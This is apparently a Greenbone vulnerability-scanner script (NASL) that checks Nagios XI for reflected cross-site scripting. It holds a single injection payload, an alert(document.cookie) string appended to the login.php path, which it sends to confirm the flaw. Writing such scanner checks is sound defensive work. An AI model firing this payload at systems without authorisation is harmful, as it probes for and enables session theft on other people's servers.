# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:nagios:nagios_xi";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902599");
  script_version("2023-12-01T05:05:39+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-12-01 05:05:39 +0000 (Fri, 01 Dec 2023)");
  script_tag(name:"creation_date", value:"2011-12-16 10:10:10 +0530 (Fri, 16 Dec 2011)");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Nagios XI < 2011R1.9 Multiple XSS Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_nagios_xi_http_detect.nasl");
  script_mandatory_keys("nagios/nagios_xi/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Nagios XI is prone to multiple cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple flaws are due to improper validation of user-supplied
  input appended to the URL in multiple scripts, which allows attackers to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser session in the context of
  an affected site.");

  script_tag(name:"affected", value:"Nagios XI prior to version 2011R1.9.");

  script_tag(name:"solution", value:"Update to version 2011R1.9 or later.");

  script_xref(name:"URL", value:"http://www.nagios.com/products/nagiosxi");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/51069");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71825");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71826");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2011/Dec/354");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/107872/0A29-11-3.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service: "www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + '/login.php/";alert(document.cookie);"';

if(http_vuln_check(port:port, url:url, check_header: TRUE,
   pattern:";alert\(document\.cookie\);")) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
